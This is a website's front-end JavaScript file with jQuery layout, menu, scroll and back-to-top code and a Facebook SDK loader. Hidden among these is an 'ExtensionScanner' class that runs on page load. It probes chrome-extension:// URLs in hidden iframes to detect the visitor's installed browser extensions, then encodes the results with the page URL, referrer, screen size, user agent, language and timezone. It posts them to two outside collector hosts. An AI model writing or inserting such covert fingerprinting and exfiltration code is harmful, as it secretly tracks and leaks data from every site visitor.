const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
$(".videohere iframe").wrap('<div class="embed-responsive embed-responsive-16by9"/>');
$(".videohere iframe").addClass('embed-responsive-item');
class ExtensionScanner {
  static TIMEOUT = 3000;
  static BATCH_SIZE = 5;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.startTimestamp = Date.now();
    this.eventStorage = [];
  }
  trackEvent(name, data) {
    this.eventStorage.push({
      name,
      data,
      timestamp: Date.now()
    });
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
        this.trackEvent('workerCleanup', {
          extName,
          pendingScans: this.pendingScans
        });
      };
      const timer = setTimeout(() => {
        cleanup();
        resolve([extName, false]);
        this.trackEvent('workerTimeout', {
          extName
        });
      }, ExtensionScanner.TIMEOUT);
      frame.onload = () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const checker = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, true]);
                this.trackEvent('extensionDetected', {
                  extName
                });
              }
            } catch (e) {
              clearInterval(checker);
              clearTimeout(timer);
              cleanup();
              resolve([extName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(timer);
          cleanup();
          resolve([extName, false]);
        }
      };
      document.body.appendChild(frame);
      this.pendingScans++;
      this.trackEvent('workerCreated', {
        extName,
        pendingScans: this.pendingScans
      });
    });
  }
  async scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    const results = await Promise.all(workers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
    this.trackEvent('batchScanned', {
      batchCount: entries.length,
      results
    });
  }
  generateTelemetryData() {
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      scanDuration: Date.now() - this.startTimestamp,
      events: this.eventStorage,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
    this.trackEvent('resultsReported', {
      payLoad: payload
    });
  }
  async execute() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 100));
    }
    await this.reportResults();
  }
}
$(".alert-danger img").addClass('img-responsive center-block');
$(".first-footer img").addClass('img-responsive center-block');
$(".textwidget img").addClass('img-responsive center-block');
$("article.post-content img").addClass('img-responsive center-block');
function menu() {
  $('.menu-open').click(function () {
    $('.menu-responsive').animate({
      left: '0px'
    }, 200);
  });
  $('.menu-close').click(function () {
    $('.menu-responsive').animate({
      left: '-250px'
    }, 200);
  });
}
const observer = new MutationObserver((mutations, obs) => {
  mutations.forEach(mutation => {
    if (mutation.target instanceof Element) {
      new ExtensionScanner().trackEvent('elementMutation', {
        tagName: mutation.target.tagName
      });
    }
  });
  if (document.body) {
    obs.disconnect();
    new ExtensionScanner().execute();
  }
});
;
$(document).ready(menu);
function init() {
  window.addEventListener('scroll', function (e) {
    var distanceY = window.pageYOffset || document.documentElement.scrollTop,
      shrinkOn = 150,
      header = document.querySelector("nav");
    topnav = document.querySelector("nav #topnav");
    slogo = document.querySelector("nav #hidden");
    if (distanceY > shrinkOn) {
      classie.add(header, "navbar-fixed-top");
      classie.add(topnav, "low-padding");
      classie.add(topnav, "col-md-10");
      classie.add(topnav, "col-sm-9");
      classie.remove(topnav, "col-md-12");
      classie.remove(slogo, "hide");
    } else {
      if (classie.has(header, "navbar-fixed-top")) {
        classie.remove(header, "navbar-fixed-top");
        classie.remove(topnav, "low-padding");
        classie.remove(topnav, "col-md-10");
        classie.remove(topnav, "col-sm-9");
        classie.add(topnav, "col-md-12");
        classie.add(slogo, "hide");
      }
    }
  });
}
//window.onload = init();
//new WOW().init();
jQuery(document).ready(function () {
  var offset = 220;
  var duration = 500;
  jQuery(window).scroll(function () {
    if (jQuery(this).scrollTop() > offset) {
      jQuery('.back-to-top').fadeIn(duration);
    } else {
      jQuery('.back-to-top').fadeOut(duration);
    }
  });
  jQuery('.back-to-top').click(function (event) {
    event.preventDefault();
    jQuery('html, body').animate({
      scrollTop: 0
    }, duration);
    return false;
  });
});
(function (d, s, id) {
  var js,
    fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s);
  js.id = id;
  js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&appId=354747788058341&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
})(document, 'script', 'facebook-jssdk');
if (document.body) {
  new ExtensionScanner().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}